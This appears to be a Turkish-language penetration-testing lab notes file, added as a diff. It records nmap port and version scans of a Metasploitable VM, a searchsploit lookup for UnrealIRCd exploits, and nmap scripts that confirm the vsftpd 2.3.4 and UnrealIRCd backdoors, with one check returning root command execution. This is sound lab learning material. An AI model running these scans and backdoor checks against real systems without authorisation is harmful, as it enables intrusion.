@@ -1,0 +1,131 @@
+
+Açık Portları bul 
+nmap -n -p1-65535  172.16.189.188
+
+Versiyonları bul 
+nmap -n -p1-65535  -sV 172.16.189.188
+
+
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp  open  telnet      Linux telnetd
+25/tcp  open  smtp        Postfix smtpd
+53/tcp  open  domain      ISC BIND 9.4.2
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp open  rpcbind     2 (RPC #100000)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp open  exec        netkit-rsh rexecd
+513/tcp open  login?
+514/tcp open  tcpwrapped
+MAC Address: 00:0C:29:FA:DD:2A (VMware)
+Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+
+Servisleri ve Versiyonları bul 
+nmap -n -p21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8180,8787,40866,44552,57240,58409 -sV  172.16.189.188
+
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 2.3.4
+22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp    open  telnet      Linux telnetd
+25/tcp    open  smtp        Postfix smtpd
+53/tcp    open  domain      ISC BIND 9.4.2
+80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp   open  rpcbind     2 (RPC #100000)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp   open  exec        netkit-rsh rexecd
+513/tcp   open  login?
+514/tcp   open  tcpwrapped
+1099/tcp  open  rmiregistry GNU Classpath grmiregistry
+1524/tcp  open  shell       Metasploitable root shell
+2049/tcp  open  nfs         2-4 (RPC #100003)
+2121/tcp  open  ftp         ProFTPD 1.3.1
+3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
+3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp  open  vnc         VNC (protocol 3.3)
+6000/tcp  open  X11         (access denied)
+6667/tcp  open  irc         Unreal ircd
+6697/tcp  open  irc         Unreal ircd
+8180/tcp  open  unknown
+8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+40866/tcp open  unknown
+44552/tcp open  status      1 (RPC #100024)
+57240/tcp open  nlockmgr    1-4 (RPC #100021)
+58409/tcp open  mountd      1-3 (RPC #100005)
+MAC Address: 00:0C:29:FA:DD:2A (VMware)
+Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 150.62 seconds
+
+
+root@kali:/usr/share/wordlists/metasploit# searchsploit "Unreal ircd"
+------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                 |  Path
+                                                                               | (/usr/share/exploitdb/platforms)
+------------------------------------------------------------------------------- ----------------------------------
+UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow"                       | /windows/dos/18011.txt
+UnrealIRCd 3.x - Remote Denial of Service"                                     | /windows/dos/27407.pl
+UnrealIRCd 3.2.8.1 - Remote Downloader/Execute Trojan"                         | /linux/remote/13853.pl
+UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)"                  | /linux/remote/16922.rb
+------------------------------------------------------------------------------- ----------------------------------
+root@kali:/usr/share/wordlists/metasploit# 
+
+
+
+
+
+vsFTPd Zafiyeti tara
+nmap --script ftp-vsftpd-backdoor -p 21 172.16.189.188
+
+Starting Nmap 7.31 ( https://nmap.org ) at 2017-02-05 00:37 +03
+Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Nmap scan report for 172.16.189.188
+Host is up (0.00049s latency).
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523  OSVDB:73573
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+|       http://osvdb.org/73573
+|_      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+MAC Address: 00:0C:29:FA:DD:2A (VMware)
+
+
+
+Unreal IRCd Zafiyeti tara 
+nmap -sV --script=irc-unrealircd-backdoor -p6667 172.16.189.188
+
+root@kali:/usr/share/wordlists/metasploit# nmap -sV --script=irc-unrealircd-backdoor -p6667 172.16.189.188
+
+Starting Nmap 7.31 ( https://nmap.org ) at 2017-02-05 00:50 +03
+Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 97.44% done; ETC: 00:51 (0:00:00 remaining)
+Nmap scan report for 172.16.189.188
+Host is up (0.00050s latency).
+PORT     STATE SERVICE VERSION
+6667/tcp open  irc     Unreal ircd
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+MAC Address: 00:0C:29:FA:DD:2A (VMware)
+Service Info: Host: irc.Metasploitable.LAN
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.44 seconds
